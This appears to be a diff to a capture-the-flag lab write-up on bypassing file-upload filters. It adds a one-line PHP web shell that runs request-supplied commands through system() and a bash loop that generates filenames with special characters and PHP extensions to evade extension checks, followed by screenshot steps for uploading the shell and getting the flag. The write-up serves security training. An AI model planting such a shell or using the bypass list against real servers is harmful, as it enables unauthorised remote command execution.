@@ -10,6 +10,10 @@ Test payload:
 ```php
 <?php echo "Hello HTB"; ?>
 ```
+- PHP shell:
+  ```php
+  <?php system($_REQUEST['cmd']); ?>
+  ```
 - Fuzzing extension whitelist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
 (It could be useful to add common image extensions).
 - Fuzzing extension list: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
@@ -43,6 +47,41 @@ We performed a extension fuzzing using `Burp Suite Intruder`:
 ![image](https://github.com/user-attachments/assets/e3d26584-e313-4a44-870c-54af813e562e)
 
 ![image](https://github.com/user-attachments/assets/78f9a8d2-ed7e-478d-a687-e36d024344b5)
+
+Also we can create a custom wordlist with the following script:
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ';'; do
+    for ext in '.php' '.phps' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
+        echo "shell$char$ext.png" >> wordlist.txt
+        echo "shell$ext$char.png" >> wordlist.txt
+        echo "shell.png$char$ext" >> wordlist.txt
+        echo "shell.png$ext$char" >> wordlist.txt
+    done
+done
+```
+Then we perform a fuzzing using this list created:
+![image](https://github.com/user-attachments/assets/30ece0ba-f8e2-4e18-b28c-143a0f3ed912)
+
+![image](https://github.com/user-attachments/assets/644c8c1c-408e-469c-980c-1ea8f0fdbc5c)
+
+We tried to get de file submitted by using `Intruder`:
+![image](https://github.com/user-attachments/assets/4c7cb8da-31a8-4972-9e68-b2d9770b37e3)
+![image](https://github.com/user-attachments/assets/ce8a7da6-cd4b-4bfb-b36c-c2194bb5ca4f)
+
+Using repetear we submitted a simple php web shell:
+![image](https://github.com/user-attachments/assets/d3a77070-151a-4839-836a-5230b96933d9)
+![image](https://github.com/user-attachments/assets/412f206a-e218-47c5-9b56-e536aeb732ee)
+
+We get the flag and solve the lab:
+![image](https://github.com/user-attachments/assets/887787b8-5edc-4add-9a55-fcded8f777b3)
+
+
+
+
+
+
+
+
 
 
 
